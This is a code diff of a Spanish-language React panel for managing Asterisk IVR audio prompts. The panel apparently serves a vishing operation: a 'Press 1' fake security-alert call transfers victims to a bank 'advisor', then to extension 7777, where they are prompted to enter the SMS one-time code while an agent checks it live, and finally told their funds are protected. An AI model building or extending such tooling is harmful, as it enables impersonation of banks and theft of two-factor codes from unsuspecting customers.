@@ -1,13 +1,11 @@
 import React, { useState, useRef, useEffect } from 'react';
-import { AudioPrompt } from '../types';
+import { AudioPrompt, AudioRole, ActiveAudioAssignments } from '../types';
 import {
   UploadCloud,
   Play,
   Pause,
   Trash2,
-  Music,
   CheckCircle,
-  FileAudio,
   Volume2,
   Mic,
   Square,
@@ -15,11 +13,18 @@ import {
   Info,
   Copy,
   FolderSync,
-  Tag,
   Radio,
   Headphones,
+  PhoneCall,
+  PhoneForwarded,
+  ShieldAlert,
+  CheckCircle2,
+  AlertTriangle,
+  RotateCcw,
+  Sliders,
+  ArrowRight,
+  RefreshCw,
 } from 'lucide-react';
-import { getAsteriskSoxCommand } from '../utils/audioHelper';
 
 interface AudioLibraryTabProps {
   audios: AudioPrompt[];
@@ -29,7 +34,112 @@ interface AudioLibraryTabProps {
   onAssignToOtp: (audioId: string) => void;
   onAssignToAgentTransfer?: (audioId: string) => void;
   onAssignTo7777?: (audioId: string) => void;
+  activeAssignments?: ActiveAudioAssignments;
+  onAssignRole?: (role: AudioRole, asteriskPath: string) => void;
 }
+
+interface RoleConfig {
+  role: AudioRole;
+  title: string;
+  badge: string;
+  badgeColor: string;
+  category: 'press1' | 'otp';
+  icon: React.ComponentType<{ className?: string }>;
+  description: string;
+  astDbKey: string;
+  fallbackDefault: string;
+}
+
+const SYSTEM_ROLES: RoleConfig[] = [
+  {
+    role: 'welcome_7777',
+    title: 'Bienvenida Extensión 7777 (Captura en Vivo)',
+    badge: 'Extensión 7777',
+    badgeColor: 'bg-purple-500/20 text-purple-300 border-purple-500/30',
+    category: 'otp',
+    icon: Headphones,
+    description: 'Audio reproducido inmediatamente al cliente cuando el asesor transfiere la llamada a la 7777 para capturar el código OTP.',
+    astDbKey: 'ivr_vars 7777_intro',
+    fallbackDefault: 'custom/solicitar_codigo_otp',
+  },
+  {
+    role: 'press1_welcome',
+    title: 'Bienvenida IVR Press 1 (Llamada Inicial)',
+    badge: 'Campaña Press 1',
+    badgeColor: 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30',
+    category: 'press1',
+    icon: PhoneCall,
+    description: 'Audio principal reproducido al contactar al cliente ("Alerta de seguridad, marque 1 para comunicarse con un asesor...").',
+    astDbKey: 'ivr_vars default_intro',
+    fallbackDefault: 'custom/bienvenida_corporativa',
+  },
+  {
+    role: 'agent_transfer',
+    title: 'Transferencia a Asesor (Al Presionar 1)',
+    badge: 'Opción 1 Asesor',
+    badgeColor: 'bg-amber-500/20 text-amber-300 border-amber-500/30',
+    category: 'press1',
+    icon: PhoneForwarded,
+    description: 'Audio de transición que escucha el cliente al presionar la tecla 1 ("Un momento, le estamos comunicando con un asesor...").',
+    astDbKey: 'ivr_vars default_agent',
+    fallbackDefault: 'custom/conectar_asesor_banco',
+  },
+  {
+    role: 'press1_invalid',
+    title: 'Opción Inválida en Menú Press 1',
+    badge: 'Opción Inválida',
+    badgeColor: 'bg-rose-500/20 text-rose-300 border-rose-500/30',
+    category: 'press1',
+    icon: AlertTriangle,
+    description: 'Audio reproducido cuando el cliente presiona una tecla distinta a 1 o se agota el tiempo sin marcar ("Opción no válida...").',
+    astDbKey: 'ivr_vars default_invalid',
+    fallbackDefault: 'custom/opcion_invalida',
+  },
+  {
+    role: 'otp_welcome',
+    title: 'Solicitud de Código OTP / Token',
+    badge: 'Captura de Código',
+    badgeColor: 'bg-blue-500/20 text-blue-300 border-blue-500/30',
+    category: 'otp',
+    icon: ShieldAlert,
+    description: 'Audio pidiéndole al cliente ingresar su código de seguridad ("Por favor ingrese el código de 6 dígitos que recibió por SMS...").',
+    astDbKey: 'ivr_vars default_prompt',
+    fallbackDefault: 'custom/solicitar_codigo_otp',
+  },
+  {
+    role: 'otp_wait',
+    title: 'Validación en Curso (Espera al Cliente)',
+    badge: 'Validación en Espera',
+    badgeColor: 'bg-cyan-500/20 text-cyan-300 border-cyan-500/30',
+    category: 'otp',
+    icon: RotateCcw,
+    description: 'Audio o música en bucle mientras el asesor verifica el código en su pantalla ("Un momento por favor, estamos validando su información...").',
+    astDbKey: 'ivr_vars default_wait',
+    fallbackDefault: 'custom/un_momento_validando_informacion',
+  },
+  {
+    role: 'otp_success',
+    title: 'Código Aprobado / Éxito de Seguridad',
+    badge: 'Validación Exitosa',
+    badgeColor: 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30',
+    category: 'otp',
+    icon: CheckCircle2,
+    description: 'Audio final cuando el código es correcto ("Su operación ha sido asegurada y sus fondos están protegidos con éxito.").',
+    astDbKey: 'ivr_vars default_success',
+    fallbackDefault: 'custom/operacion_bloqueada_exito',
+  },
+  {
+    role: 'otp_failure',
+    title: 'Código Inválido / Reintentar Dígitos',
+    badge: 'Código Inválido',
+    badgeColor: 'bg-rose-500/20 text-rose-300 border-rose-500/30',
+    category: 'otp',
+    icon: AlertTriangle,
+    description: 'Audio cuando el asesor marca el código como inválido ("El código ingresado no es correcto, por favor vuelva a ingresarlo.").',
+    astDbKey: 'ivr_vars default_failure',
+    fallbackDefault: 'custom/token_invalido_reintente',
+  },
+];
 
 export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
   audios,
@@ -39,49 +149,89 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
   onAssignToOtp,
   onAssignToAgentTransfer,
   onAssignTo7777,
+  activeAssignments: propActiveAssignments,
+  onAssignRole,
 }) => {
   const [playingAudioId, setPlayingAudioId] = useState<string | null>(null);
   const audioPlayerRef = useRef<HTMLAudioElement | null>(null);
 
-  // Active audio for 7777
-  const [current7777Audio, setCurrent7777Audio] = useState<string>('custom/solicitar_codigo_otp');
-  const [isAssigning7777, setIsAssigning7777] = useState(false);
-  const [successMsg7777, setSuccessMsg7777] = useState<string | null>(null);
+  // Active assignments state
+  const [activeAssignments, setActiveAssignments] = useState<ActiveAudioAssignments>(
+    propActiveAssignments || {
+      press1_welcome: 'custom/bienvenida_corporativa',
+      agent_transfer: 'custom/conectar_asesor_banco',
+      press1_invalid: 'custom/opcion_invalida',
+      welcome_7777: 'custom/solicitar_codigo_otp',
+      otp_welcome: 'custom/solicitar_codigo_otp',
+      otp_wait: 'custom/un_momento_validando_informacion',
+      otp_success: 'custom/operacion_bloqueada_exito',
+      otp_failure: 'custom/token_invalido_reintente',
+    }
+  );
+
+  const [isSyncingRole, setIsSyncingRole] = useState<Record<string, boolean>>({});
+  const [feedbackMsg, setFeedbackMsg] = useState<{ text: string; type: 'success' | 'info' } | null>(null);
+  const [filterCategory, setFilterCategory] = useState<'all' | 'press1' | 'otp'>('all');
+
+  // Fetch active audio assignments on mount
+  const fetchActiveAssignments = async () => {
+    try {
+      const res = await fetch('/api/asterisk/audio/active-assignments');
+      const data = await res.json();
+      if (data.success && data.assignments) {
+        setActiveAssignments(data.assignments);
+      }
+    } catch (e) {
+      console.warn('Error al obtener asignaciones activas de audio:', e);
+    }
+  };
 
   useEffect(() => {
-    fetch('/api/asterisk/audio/current-7777')
-      .then((r) => r.json())
-      .then((data) => {
-        if (data.success && data.currentAudio) {
-          setCurrent7777Audio(data.currentAudio);
-        }
-      })
-      .catch(() => {});
+    fetchActiveAssignments();
   }, []);
 
-  const handleAssignTo7777Direct = async (asteriskPath: string, audioId?: string) => {
-    setIsAssigning7777(true);
+  useEffect(() => {
+    if (propActiveAssignments) {
+      setActiveAssignments(propActiveAssignments);
+    }
+  }, [propActiveAssignments]);
+
+  const handleAssignRoleDirect = async (role: AudioRole, asteriskPath: string) => {
+    setIsSyncingRole((prev) => ({ ...prev, [role]: true }));
     try {
       const res = await fetch('/api/asterisk/audio/assign', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ role: 'welcome_7777', asteriskPath }),
+        body: JSON.stringify({ role, asteriskPath }),
       });
       const data = await res.json();
       if (data.success) {
-        setCurrent7777Audio(asteriskPath);
-        if (audioId) onAssignTo7777?.(audioId);
-        setSuccessMsg7777(`¡Audio "${asteriskPath}" asignado a la bienvenida de Ext 7777!`);
-        setTimeout(() => setSuccessMsg7777(null), 4000);
+        setActiveAssignments((prev) => ({
+          ...prev,
+          ...(data.assignments || { [role]: asteriskPath }),
+        }));
+        onAssignRole?.(role, asteriskPath);
+
+        const roleConfig = SYSTEM_ROLES.find((r) => r.role === role);
+        setFeedbackMsg({
+          text: `¡${roleConfig?.title || role} actualizado a "${asteriskPath}" en Asterisk AstDB!`,
+          type: 'success',
+        });
+        setTimeout(() => setFeedbackMsg(null), 4500);
       }
     } catch (e) {
-      console.error('Error assigning 7777 audio:', e);
+      console.error('Error assigning audio role:', e);
+      setFeedbackMsg({
+        text: `Error al actualizar ${role} en Asterisk. Verifica la conexión con el servidor.`,
+        type: 'info',
+      });
+      setTimeout(() => setFeedbackMsg(null), 4500);
     } finally {
-      setIsAssigning7777(false);
+      setIsSyncingRole((prev) => ({ ...prev, [role]: false }));
     }
   };
 
-  // Upload state
+  // Upload modal state
   const [isDragging, setIsDragging] = useState(false);
   const [isUploadModalOpen, setIsUploadModalOpen] = useState(false);
   const [newAudioName, setNewAudioName] = useState('');
@@ -90,6 +240,7 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
   const [stagedFileName, setStagedFileName] = useState('');
   const [stagedFileSize, setStagedFileSize] = useState('');
   const [stagedDuration, setStagedDuration] = useState(4.0);
+  const [autoActivateRole, setAutoActivateRole] = useState(true);
 
   // Live Microphone Recording state
   const [isRecording, setIsRecording] = useState(false);
@@ -104,10 +255,11 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
     welcome_7777: { label: 'Bienvenida Extensión 7777', color: 'text-purple-400 bg-purple-500/10 border-purple-500/20 font-bold' },
     press1_welcome: { label: 'IVR Bienvenida Press 1', color: 'text-emerald-400 bg-emerald-500/10 border-emerald-500/20' },
     press1_invalid: { label: 'IVR Opción Inválida', color: 'text-rose-400 bg-rose-500/10 border-rose-500/20' },
-    agent_transfer: { label: 'Transferencia Asesor (Press 1)', color: 'text-amber-400 bg-amber-500/10 border-amber-500/20' },
+    agent_transfer: { label: 'Transferencia Asesor (Opción 1)', color: 'text-amber-400 bg-amber-500/10 border-amber-500/20' },
     otp_welcome: { label: 'Captura OTP Instrucción', color: 'text-blue-400 bg-blue-500/10 border-blue-500/20' },
+    otp_wait: { label: 'Validación en Espera', color: 'text-cyan-400 bg-cyan-500/10 border-cyan-500/20' },
     otp_success: { label: 'OTP Validación Exitosa', color: 'text-emerald-400 bg-emerald-500/10 border-emerald-500/20' },
-    otp_failure: { label: 'OTP Error o Expirado', color: 'text-purple-400 bg-purple-500/10 border-purple-500/20' },
+    otp_failure: { label: 'OTP Error o Expirado', color: 'text-rose-400 bg-rose-500/10 border-rose-500/20' },
     hold_music: { label: 'Música de Espera (MOH)', color: 'text-cyan-400 bg-cyan-500/10 border-cyan-500/20' },
     custom: { label: 'Anuncio Personalizado', color: 'text-slate-300 bg-slate-800 border-slate-700' },
   };
@@ -132,7 +284,21 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
     }
   };
 
-  const processFile = (file: File) => {
+  const handlePlayByPath = (asteriskPath: string) => {
+    const clean = asteriskPath.replace(/\.wav$/, '');
+    const match = audios.find((a) => a.asteriskPath === clean || a.asteriskPath === `custom/${clean.replace(/^custom\//, '')}`);
+    if (match) {
+      handlePlayToggle(match);
+    } else {
+      setFeedbackMsg({
+        text: `Audio "${asteriskPath}" está configurado en el servidor Asterisk.`,
+        type: 'info',
+      });
+      setTimeout(() => setFeedbackMsg(null), 3500);
+    }
+  };
+
+  const processFile = (file: File, preselectedCategory?: AudioPrompt['category']) => {
     const reader = new FileReader();
     reader.onload = (e) => {
       const dataUrl = e.target?.result as string;
@@ -140,7 +306,6 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
       setStagedFileName(file.name);
       setStagedFileSize(`${(file.size / 1024).toFixed(1)} KB`);
 
-      // Detect duration using temporary Audio object
       const tempAudio = new Audio(dataUrl);
       tempAudio.onloadedmetadata = () => {
         const dur = Math.round(tempAudio.duration * 10) / 10 || 5.0;
@@ -148,37 +313,39 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
       };
 
       if (!newAudioName) {
-        setNewAudioName(file.name.replace(/\.[^/.]+$/, '').replace(/[-_]/g, ' '));
+        const cleanName = file.name.replace(/\.[^/.]+$/, '').replace(/[_-]/g, ' ');
+        setNewAudioName(cleanName.charAt(0).toUpperCase() + cleanName.slice(1));
+      }
+      if (preselectedCategory) {
+        setNewAudioCategory(preselectedCategory);
       }
       setIsUploadModalOpen(true);
     };
     reader.readAsDataURL(file);
   };
 
-  const handleFileDrop = (e: React.DragEvent<HTMLDivElement>) => {
+  const handleFileInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const files = e.target.files;
+    if (files && files[0]) {
+      processFile(files[0]);
+    }
+  };
+
+  const handleFileDrop = (e: React.DragEvent) => {
     e.preventDefault();
     setIsDragging(false);
-    if (e.dataTransfer.files && e.dataTransfer.files.length > 0) {
-      const file = e.dataTransfer.files[0];
-      if (file.type.includes('audio') || file.name.endsWith('.wav') || file.name.endsWith('.mp3')) {
-        processFile(file);
-      }
+    const files = e.dataTransfer.files;
+    if (files && files[0]) {
+      processFile(files[0]);
     }
   };
 
-  const handleFileInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    if (e.target.files && e.target.files.length > 0) {
-      processFile(e.target.files[0]);
-    }
-  };
-
-  // Live microphone recording
   const startRecording = async () => {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      audioChunksRef.current = [];
       const mediaRecorder = new MediaRecorder(stream);
       mediaRecorderRef.current = mediaRecorder;
-      audioChunksRef.current = [];
 
       mediaRecorder.ondataavailable = (event) => {
         if (event.data.size > 0) {
@@ -189,26 +356,31 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
       mediaRecorder.onstop = () => {
         const audioBlob = new Blob(audioChunksRef.current, { type: 'audio/webm' });
         const reader = new FileReader();
-        reader.onloadend = () => {
-          setStagedFileDataUrl(reader.result as string);
-          setStagedFileName(`grabacion_${Date.now()}.webm`);
+        reader.onload = (e) => {
+          const dataUrl = e.target?.result as string;
+          const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
+          const fileName = `grabacion_mic_${timestamp}.wav`;
+          setStagedFileDataUrl(dataUrl);
+          setStagedFileName(fileName);
           setStagedFileSize(`${(audioBlob.size / 1024).toFixed(1)} KB`);
-          setStagedDuration(recordingTime || 4.0);
-          setNewAudioName(`Grabación de Voz ${new Date().toLocaleTimeString()}`);
+          setStagedDuration(recordingTime);
+          setNewAudioName(`Locución en vivo (${recordingTime}s)`);
           setIsUploadModalOpen(true);
         };
         reader.readAsDataURL(audioBlob);
+
         stream.getTracks().forEach((track) => track.stop());
       };
 
       mediaRecorder.start();
       setIsRecording(true);
       setRecordingTime(0);
+
       recordingTimerRef.current = setInterval(() => {
         setRecordingTime((prev) => prev + 1);
       }, 1000);
     } catch (err) {
-      alert('No se pudo acceder al micrófono. Verifique los permisos del navegador.');
+      alert('No se pudo acceder al micrófono para grabar. Verifica los permisos.');
     }
   };
 
@@ -216,43 +388,82 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
     if (mediaRecorderRef.current && isRecording) {
       mediaRecorderRef.current.stop();
       setIsRecording(false);
-      if (recordingTimerRef.current) clearInterval(recordingTimerRef.current);
+      if (recordingTimerRef.current) {
+        clearInterval(recordingTimerRef.current);
+      }
     }
   };
 
-  const handleSaveAudio = (e: React.FormEvent) => {
+  const handleSaveAudio = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!stagedFileDataUrl || !newAudioName) return;
+    if (!stagedFileDataUrl) return;
 
-    const cleanFilename = stagedFileName
+    const baseName = stagedFileName
+      .replace(/\.[^/.]+$/, '')
       .toLowerCase()
-      .replace(/\s+/g, '_')
-      .replace(/[^a-z0-9_.]/g, '');
-    const asteriskSoundName = cleanFilename.replace(/\.[^/.]+$/, '');
+      .replace(/[^a-z0-9_]/g, '_');
 
-    const newPrompt: AudioPrompt = {
-      id: `audio-${Date.now()}-${Math.random().toString(36).slice(-4)}`,
-      name: newAudioName,
+    const cleanPath = `custom/${baseName}`;
+
+    const newAudio: AudioPrompt = {
+      id: `audio-${Date.now()}`,
+      name: newAudioName || stagedFileName,
       category: newAudioCategory,
-      fileName: cleanFilename,
-      fileSize: stagedFileSize || '250 KB',
+      fileName: `${baseName}.wav`,
+      fileSize: stagedFileSize,
       durationSec: stagedDuration,
-      format: 'audio/wav',
-      sampleRate: '8000 Hz, 16-bit Mono (Estándar Asterisk)',
+      format: 'WAV',
+      sampleRate: '8000Hz PCM 16-bit Mono',
       dataUrl: stagedFileDataUrl,
-      asteriskPath: `custom/${asteriskSoundName}`,
-      createdAt: new Date().toLocaleString(),
+      asteriskPath: cleanPath,
+      createdAt: new Date().toISOString(),
     };
 
-    onAddAudio(newPrompt);
+    onAddAudio(newAudio);
+
+    // Save to backend filesystem
+    try {
+      const res = await fetch('/api/asterisk/audio/save', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          dataUrl: stagedFileDataUrl,
+          fileName: `${baseName}.wav`,
+          category: newAudioCategory,
+        }),
+      });
+      const data = await res.json();
+      if (data.success) {
+        console.log('[AUDIO SAVED TO DISK]', data);
+      }
+    } catch (err) {
+      console.warn('Backend audio save error:', err);
+    }
+
+    // Auto-activate as live audio in Asterisk if requested
+    if (autoActivateRole && newAudioCategory !== 'custom' && newAudioCategory !== 'hold_music') {
+      handleAssignRoleDirect(newAudioCategory as AudioRole, cleanPath);
+    }
+
     setIsUploadModalOpen(false);
     setStagedFileDataUrl(null);
+    setStagedFileName('');
     setNewAudioName('');
   };
 
   const copyToClipboard = (text: string) => {
     navigator.clipboard.writeText(text);
+    setFeedbackMsg({
+      text: `Comando copiado al portapapeles: "${text}"`,
+      type: 'info',
+    });
+    setTimeout(() => setFeedbackMsg(null), 3000);
   };
+
+  const filteredRoles = SYSTEM_ROLES.filter((r) => {
+    if (filterCategory === 'all') return true;
+    return r.category === filterCategory;
+  });
 
   return (
     <div className="space-y-6">
@@ -261,18 +472,26 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
         <div>
           <h2 className="text-xl font-bold text-white tracking-tight flex items-center gap-2">
             <Volume2 className="w-6 h-6 text-emerald-400" />
-            <span>Audioteca de Mensajes Pregrabados</span>
+            <span>Gestor de Mensajes Pregrabados del Sistema</span>
             <span className="text-xs px-2 py-0.5 rounded bg-slate-800 text-slate-300 font-mono">
               {audios.length} audios
             </span>
           </h2>
           <p className="text-sm text-slate-400">
-            Sube locuciones profesionales para tus campañas de <strong>Press 1</strong> y <strong>Captura de OTP</strong>.
-            Sincronización directa con el directorio <code className="text-emerald-400 font-mono text-xs">/var/lib/asterisk/sounds/custom/</code>.
+            Controla y cambia los audios pregrabados en tiempo real desde la web. Cada cambio se aplica inmediatamente en <strong>Asterisk AstDB</strong> sin necesidad de reiniciar la central.
           </p>
         </div>
 
-        <div className="flex items-center gap-2">
+        <div className="flex items-center gap-2 flex-wrap">
+          <button
+            onClick={fetchActiveAssignments}
+            className="inline-flex items-center space-x-1.5 px-3 py-2 rounded-lg text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 transition-colors"
+            title="Recargar estado actual de audios desde Asterisk AstDB"
+          >
+            <RefreshCw className="w-3.5 h-3.5 text-slate-400" />
+            <span>Actualizar Estado</span>
+          </button>
+
           {isRecording ? (
             <button
               onClick={stopRecording}
@@ -309,6 +528,187 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
         </div>
       </div>
 
+      {/* Floating feedback message */}
+      {feedbackMsg && (
+        <div
+          className={`p-3 rounded-xl border flex items-center justify-between gap-3 text-xs transition-all ${
+            feedbackMsg.type === 'success'
+              ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-300'
+              : 'bg-blue-500/10 border-blue-500/30 text-blue-300'
+          }`}
+        >
+          <div className="flex items-center gap-2">
+            <CheckCircle className="w-4 h-4 shrink-0" />
+            <span>{feedbackMsg.text}</span>
+          </div>
+          <button
+            onClick={() => setFeedbackMsg(null)}
+            className="text-slate-400 hover:text-white font-mono"
+          >
+            &times;
+          </button>
+        </div>
+      )}
+
+      {/* SECTION 1: MATRIZ DE ASIGNACIÓN EN VIVO (CAMBIAR AUDIOS EN 1 CLIC) */}
+      <div className="p-5 rounded-xl bg-slate-900 border border-slate-800 space-y-4">
+        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-slate-800">
+          <div className="flex items-center gap-2.5">
+            <div className="w-8 h-8 rounded-lg bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-400">
+              <Sliders className="w-4 h-4" />
+            </div>
+            <div>
+              <h3 className="text-sm font-bold text-white">
+                Centro de Control de Mensajes Pregrabados (En Vivo en Asterisk)
+              </h3>
+              <p className="text-xs text-slate-400">
+                Selecciona cualquier audio de tu biblioteca para cambiar al instante lo que Asterisk reproduce en cada etapa de la llamada.
+              </p>
+            </div>
+          </div>
+
+          <div className="flex items-center gap-1.5 self-start sm:self-auto bg-slate-950 p-1 rounded-lg border border-slate-800 text-xs">
+            <button
+              onClick={() => setFilterCategory('all')}
+              className={`px-2.5 py-1 rounded transition-colors ${
+                filterCategory === 'all'
+                  ? 'bg-emerald-500 text-black font-bold'
+                  : 'text-slate-400 hover:text-slate-200'
+              }`}
+            >
+              Todos ({SYSTEM_ROLES.length})
+            </button>
+            <button
+              onClick={() => setFilterCategory('otp')}
+              className={`px-2.5 py-1 rounded transition-colors ${
+                filterCategory === 'otp'
+                  ? 'bg-purple-500 text-white font-bold'
+                  : 'text-slate-400 hover:text-slate-200'
+              }`}
+            >
+              Ext 7777 / OTP (5)
+            </button>
+            <button
+              onClick={() => setFilterCategory('press1')}
+              className={`px-2.5 py-1 rounded transition-colors ${
+                filterCategory === 'press1'
+                  ? 'bg-emerald-500 text-black font-bold'
+                  : 'text-slate-400 hover:text-slate-200'
+              }`}
+            >
+              Press 1 (3)
+            </button>
+          </div>
+        </div>
+
+        {/* Roles Grid */}
+        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+          {filteredRoles.map((roleConf) => {
+            const Icon = roleConf.icon;
+            const currentAudioPath = activeAssignments[roleConf.role] || roleConf.fallbackDefault;
+            const isSyncing = !!isSyncingRole[roleConf.role];
+            const matchedAudio = audios.find((a) => a.asteriskPath === currentAudioPath.replace(/\.wav$/, ''));
+            const isPlayingCurrent = matchedAudio && playingAudioId === matchedAudio.id;
+
+            return (
+              <div
+                key={roleConf.role}
+                className={`p-4 rounded-xl border transition-all flex flex-col justify-between space-y-3 ${
+                  roleConf.role === 'welcome_7777'
+                    ? 'bg-gradient-to-br from-purple-950/30 to-slate-950 border-purple-500/40 shadow-md'
+                    : 'bg-slate-950/70 border-slate-800 hover:border-slate-700'
+                }`}
+              >
+                <div>
+                  <div className="flex items-start justify-between gap-2 mb-2">
+                    <div className="flex items-center gap-2">
+                      <div className="w-7 h-7 rounded-md bg-slate-800 flex items-center justify-center text-slate-300">
+                        <Icon className="w-4 h-4 text-emerald-400" />
+                      </div>
+                      <div>
+                        <h4 className="font-semibold text-white text-xs leading-snug">
+                          {roleConf.title}
+                        </h4>
+                      </div>
+                    </div>
+                    <span className={`text-[10px] font-semibold px-2 py-0.5 rounded-full border shrink-0 ${roleConf.badgeColor}`}>
+                      {roleConf.badge}
+                    </span>
+                  </div>
+
+                  <p className="text-[11px] text-slate-400 leading-relaxed">
+                    {roleConf.description}
+                  </p>
+                </div>
+
+                {/* Current assignment & Selector */}
+                <div className="space-y-2 pt-2 border-t border-slate-800/80">
+                  <div className="flex items-center justify-between text-[11px]">
+                    <span className="text-slate-400 font-medium">Audio actual en central:</span>
+                    <span className="font-mono text-emerald-400 font-bold truncate max-w-[190px]">
+                      {currentAudioPath}
+                    </span>
+                  </div>
+
+                  <div className="flex items-center gap-2">
+                    <select
+                      value={currentAudioPath}
+                      disabled={isSyncing}
+                      onChange={(e) => handleAssignRoleDirect(roleConf.role, e.target.value)}
+                      className="flex-1 px-2.5 py-1.5 rounded-lg bg-slate-900 border border-slate-700 text-slate-200 text-xs font-mono focus:border-emerald-500 focus:outline-none"
+                    >
+                      {audios.map((a) => (
+                        <option key={a.id} value={a.asteriskPath}>
+                          {a.name} ({a.asteriskPath})
+                        </option>
+                      ))}
+                    </select>
+
+                    <button
+                      onClick={() => handlePlayByPath(currentAudioPath)}
+                      className={`p-2 rounded-lg transition-colors shrink-0 ${
+                        isPlayingCurrent
+                          ? 'bg-emerald-500 text-black shadow-md shadow-emerald-500/20 animate-pulse'
+                          : 'bg-slate-800 hover:bg-slate-700 text-slate-200'
+                      }`}
+                      title="Escuchar audio actualmente asignado"
+                    >
+                      {isPlayingCurrent ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5" />}
+                    </button>
+
+                    <button
+                      onClick={() => {
+                        setNewAudioCategory(roleConf.role as AudioPrompt['category']);
+                        setNewAudioName(roleConf.title);
+                        fileInputRef.current?.click();
+                      }}
+                      className="p-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white transition-colors shrink-0"
+                      title={`Subir un nuevo audio directamente para: ${roleConf.title}`}
+                    >
+                      <UploadCloud className="w-3.5 h-3.5 text-emerald-400" />
+                    </button>
+                  </div>
+
+                  {/* AstDB sync status & manual command copy */}
+                  <div className="flex items-center justify-between text-[10px] text-slate-400 font-mono bg-slate-900/80 px-2 py-1 rounded">
+                    <span className="truncate">AstDB: {roleConf.astDbKey} = "{currentAudioPath}"</span>
+                    <button
+                      onClick={() =>
+                        copyToClipboard(`asterisk -rx 'database put ${roleConf.astDbKey} "${currentAudioPath}"'`)
+                      }
+                      className="text-slate-400 hover:text-emerald-400 p-0.5 ml-1 shrink-0"
+                      title="Copiar comando CLI de Asterisk"
+                    >
+                      <Copy className="w-3 h-3" />
+                    </button>
+                  </div>
+                </div>
+              </div>
+            );
+          })}
+        </div>
+      </div>
+
       {/* Drag & Drop Upload Zone (Guideline compliant: supports both drag-and-drop and click) */}
       <div
         onDragOver={(e) => {
@@ -337,130 +737,15 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
         </div>
       </div>
 
-      {/* Asterisk Sound Standard & Deployment Box */}
-      <div className="p-4 rounded-xl bg-slate-900 border border-slate-800 flex flex-col md:flex-row items-start md:items-center justify-between gap-4 text-xs">
-        <div className="flex items-start space-x-3">
-          <Info className="w-5 h-5 text-blue-400 shrink-0 mt-0.5" />
-          <div className="space-y-1">
-            <span className="font-semibold text-slate-200">Recomendación de Audio para Asterisk 20:</span>
-            <p className="text-slate-400 leading-relaxed">
-              Asterisk opera de forma óptima con audio en <strong>PCM Mono a 8 kHz y 16 bits</strong> (<code className="text-emerald-400 font-mono">format=wav</code> o <code className="text-emerald-400 font-mono">sln16</code>). Puedes sincronizar todos los audios a tu servidor con el comando rsync.
-            </p>
-          </div>
-        </div>
-        <button
-          onClick={() =>
-            copyToClipboard(
-              'rsync -avz /local/sounds/ root@asterisk-server:/var/lib/asterisk/sounds/custom/'
-            )
-          }
-          className="inline-flex items-center space-x-1.5 px-3 py-1.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 shrink-0 font-mono text-[11px]"
-          title="Copiar comando rsync para transferir audios al servidor"
-        >
-          <Copy className="w-3.5 h-3.5" />
-          <span>Copiar comando rsync</span>
-        </button>
-      </div>
-
-      {/* DEDICATED BANNER: EXTENSIÓN 7777 BIENVENIDA */}
-      <div className="p-5 rounded-xl bg-gradient-to-r from-purple-950/40 via-slate-900 to-slate-900 border border-purple-500/30 shadow-lg space-y-4">
-        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
-          <div className="flex items-start space-x-3">
-            <div className="w-10 h-10 rounded-lg bg-purple-500/20 border border-purple-500/30 flex items-center justify-center text-purple-400 shrink-0">
-              <Headphones className="w-5 h-5" />
-            </div>
-            <div>
-              <div className="flex items-center gap-2 flex-wrap">
-                <h3 className="text-sm font-bold text-white tracking-wide">
-                  Locución de Bienvenida para Extensión 7777 (Captura en Vivo)
-                </h3>
-                <span className="text-[10px] px-2 py-0.5 rounded-full bg-purple-500/20 text-purple-300 border border-purple-500/30 font-semibold font-mono">
-                  Ext 7777 Activa
-                </span>
-              </div>
-              <p className="text-xs text-slate-300 mt-1">
-                Este es el audio que escuchará el cliente en cuanto el asesor transfiera la llamada a la <strong>7777</strong> pidiéndole digitar su código.
-              </p>
-            </div>
-          </div>
-
-          <div className="flex items-center gap-2 shrink-0">
-            <button
-              onClick={() => {
-                setNewAudioCategory('welcome_7777');
-                setNewAudioName('Bienvenida Extensión 7777');
-                fileInputRef.current?.click();
-              }}
-              className="inline-flex items-center space-x-1.5 px-3.5 py-2 rounded-lg text-xs font-bold bg-purple-600 hover:bg-purple-500 text-white shadow-md shadow-purple-600/20 transition-colors"
-              title="Subir archivo de audio directamente para la extensión 7777"
-            >
-              <UploadCloud className="w-4 h-4" />
-              <span>Subir Audio para 7777</span>
-            </button>
-          </div>
-        </div>
-
-        {successMsg7777 && (
-          <div className="p-2.5 rounded bg-emerald-500/10 border border-emerald-500/30 text-emerald-300 text-xs flex items-center gap-2">
-            <CheckCircle className="w-4 h-4 shrink-0" />
-            <span>{successMsg7777}</span>
-          </div>
-        )}
-
-        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3 pt-2 border-t border-slate-800/80 text-xs">
